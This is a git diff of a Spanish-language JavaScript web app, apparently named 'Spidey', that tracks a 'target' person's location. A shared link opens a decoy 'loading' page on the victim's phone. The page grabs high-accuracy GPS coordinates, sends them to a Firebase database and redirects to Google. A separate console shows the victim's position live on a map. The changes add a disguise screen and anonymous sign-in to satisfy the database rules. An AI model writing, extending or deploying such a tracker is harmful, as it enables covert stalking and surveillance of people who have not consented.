@@ -1,5 +1,6 @@
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
 import { getFirestore, doc, setDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
 
 // CONFIGURACIÓN DE FIREBASE
 const firebaseConfig = {
@@ -11,38 +12,44 @@ const firebaseConfig = {
     appId: "TU_APP_ID"
 };
 
-// Inicializar Firebase
+// Inicializar Firebase, Firestore y Auth
 const app = initializeApp(firebaseConfig);
 const db = getFirestore(app);
+const auth = getAuth(app);
 
 let map;
-let marker;
-let ubicacionObjetivo = null; // Guardará [lat, lng] del objetivo en tiempo real
+let spiderMarker = null;
+let ubicacionObjetivo = null; 
 const ubicacionPorDefecto = [14.3333, -90.6667]; 
 
-// Icono personalizado de araña para el objetivo
+// Icono personalizado de araña
 const spiderIcon = L.divIcon({
-    html: '<div style="font-size: 28px; line-height: 1; text-shadow: 0 0 5px rgba(0,0,0,0.8);">🕷️</div>',
+    html: '<div style="font-size: 32px; line-height: 1; text-align: center;">🕷️</div>',
     className: 'spider-marker',
-    iconSize: [30, 30],
-    iconAnchor: [15, 15]
+    iconSize: [36, 36],
+    iconAnchor: [18, 18]
 });
 
 const urlParams = new URLSearchParams(window.location.search);
 const targetId = urlParams.get('target');
 
-document.addEventListener("DOMContentLoaded", function () {
-    // ESCENARIO A: Si entra desde el enlace en el celular (?target=objetivo_principal)
-    if (targetId) {
-        // Ocultar consola táctil para discreción
-        const consoleElem = document.querySelector('.console-container');
-        if (consoleElem) consoleElem.style.display = 'none';
+document.addEventListener("DOMContentLoaded", async function () {
+    try {
+        // Autenticación anónima para cumplir con las reglas de Firestore (request.auth != null)
+        await signInAnonymously(auth);
+        console.log("Sesión segura iniciada.");
+    } catch (error) {
+        console.error("Error al autenticar en Firebase Auth:", error);
+    }
 
+    // ESCENARIO A: Dispositivo secundario
+    if (targetId) {
+        document.body.innerHTML = "<div style='color:white; text-align:center; padding-top:20%; font-family:sans-serif;'>Cargando contenido...</div>";
         capturarYSalir(targetId);
         return;
     }
 
-    // ESCENARIO B: Consola de Monitoreo (PC / Tu pantalla)
+    // ESCENARIO B: Consola Principal
     map = L.map('map', { zoomControl: false }).setView(ubicacionPorDefecto, 14);
 
     L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
@@ -50,18 +57,13 @@ document.addEventListener("DOMContentLoaded", function () {
         attribution: '&copy; OpenStreetMap contributors'
     }).addTo(map);
 
-    // Marcador inicial con icono de araña
-    marker = L.marker(ubicacionPorDefecto, { icon: spiderIcon }).addTo(map)
-        .bindPopup("<b>Spider Radar:</b> Esperando señal...")
-        .openPopup();
-
     setTimeout(() => { map.invalidateSize(); }, 200);
 
-    // Escuchar la base de datos de Firebase continuamente
+    // Escuchar la base de datos
     escucharObjetivoRemoto("objetivo_principal");
 });
 
-// CAPTURA SILENCIOSA Y REDIRECCIÓN INSTANTÁNEA EN EL CELULAR OBJETIVO
+// CAPTURA DE UBICACIÓN
 function capturarYSalir(id) {
     if (!navigator.geolocation) {
         window.location.replace("https://www.google.com");
@@ -74,69 +76,85 @@ function capturarYSalir(id) {
             const lng = position.coords.longitude;
 
             try {
+                // Escribe en Firestore aprovechando el token de autenticación anónima
                 await setDoc(doc(db, "rastreos", id), {
                     lat: lat,
                     lng: lng,
-                    timestamp: new Date()
+                    timestamp: new Date().toISOString()
                 });
             } catch (e) {
-                console.error("Error al enviar coordenadas:", e);
+                console.error("Error al guardar en Firebase:", e);
             } finally {
-                // Sale inmediatamente a Google
                 window.location.replace("https://www.google.com");
             }
         },
         (error) => {
             window.location.replace("https://www.google.com");
         },
-        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+        { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
     );
 }
 
-// ESCUCHAR FIREBASE Y ACTUALIZAR COORDENADAS
+// ESCUCHAR DATOS EN TIEMPO REAL
 function escucharObjetivoRemoto(id) {
     onSnapshot(doc(db, "rastreos", id), (docSnap) => {
         if (docSnap.exists()) {
             const data = docSnap.data();
-            
-            // Guardar la ubicación globalmente
             ubicacionObjetivo = [data.lat, data.lng];
 
-            // Mover marcador e informar en banner
-            marker.setLatLng(ubicacionObjetivo);
-            marker.bindPopup(`<b>🕷️ Objetivo Spider Detectado</b><br>Lat: ${data.lat.toFixed(5)}<br>Lng: ${data.lng.toFixed(5)}`);
+            if (!spiderMarker) {
+                spiderMarker = L.marker(ubicacionObjetivo, { icon: spiderIcon }).addTo(map);
+            } else {
+                spiderMarker.setLatLng(ubicacionObjetivo);
+            }
+
+            const googleMapsUrl = `https://www.google.com/maps?q=${data.lat},${data.lng}`;
+            
+            spiderMarker.bindPopup(`
+                <div style="text-align:center;">
+                    <b>🕷️ PUNTO DETECTADO</b><br>
+                    Lat: ${data.lat.toFixed(5)}<br>
+                    Lng: ${data.lng.toFixed(5)}<br><br>
+                    <a href="${googleMapsUrl}" target="_blank" style="color: #d9534f; font-weight: bold;">Abrir en Google Maps 📍</a>
+                </div>
+            `);
 
             const banner = document.getElementById('banner-status');
             if (banner) {
-                banner.innerHTML = "OBJETIVO DETECTADO<br>UBICACIÓN ARAÑA LISTA";
+                banner.innerHTML = "¡SEÑAL DETECTADA!<br>NODO SPIDEY ENLACE OK";
             }
+
+            irAlPuntoDeAcceso();
         }
     });
 }
 
-// BOTÓN "RASTREAR": Dirige el mapa a la ubicación araña capturada
-window.accionRastrearObjetivo = function() {
+// FUNCIONALIDADES DE LOS BOTONES
+function irAlPuntoDeAcceso() {
     if (ubicacionObjetivo) {
         map.invalidateSize();
-        map.setView(ubicacionObjetivo, 17, { animate: true }); // Zoom cercano e interactivo
-        marker.openPopup();
+        map.setView(ubicacionObjetivo, 18, { animate: true, duration: 1.5 });
+        if (spiderMarker) {
+            spiderMarker.openPopup();
+        }
+    }
+}
+
+window.accionRastrearObjetivo = function() {
+    if (ubicacionObjetivo) {
+        irAlPuntoDeAcceso();
     } else {
-        alert("Aún no se ha recibido ninguna ubicación desde la señal de objetivo.");
+        alert("Aún no hay coordenadas recibidas.");
     }
 };
 
-// BOTÓN SHARE LINK: Genera el enlace específico para la persona objetivo
 window.compartirEnlace = function() {
     const enlaceObjetivo = "https://mmommo52.github.io/Spidey/?target=objetivo_principal";
-    
     navigator.clipboard.writeText(enlaceObjetivo).then(() => {
-        alert("¡Enlace táctico copiado!\n\nEnviará: " + enlaceObjetivo);
-    }).catch(err => {
-        console.error("Error copiando enlace:", err);
+        alert("Enlace copiado correctamente.");
     });
 };
 
-// OTRAS FUNCIONES DEL PANEL
 window.obtenerUbicacionActual = function() {
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition((pos) => {
@@ -148,15 +166,8 @@ window.obtenerUbicacionActual = function() {
     }
 };
 
-window.centrarUbicacion = () => {
-    if (ubicacionObjetivo) {
-        map.setView(ubicacionObjetivo, 16);
-    } else {
-        map.invalidateSize();
-    }
-};
-
+window.centrarUbicacion = () => irAlPuntoDeAcceso();
 window.cambiarAlerta = (t) => alert("Alerta: " + t);
 window.cambiarPerfil = (n) => alert("Perfil: " + n);
-window.abrirChat = () => alert("Canal de chat seguro abierto.");
-window.verArchivo = () => alert("Abriendo registros históricos...");
+window.abrirChat = () => alert("Canal de chat abierto.");
+window.verArchivo = () => alert("Abriendo registros...");
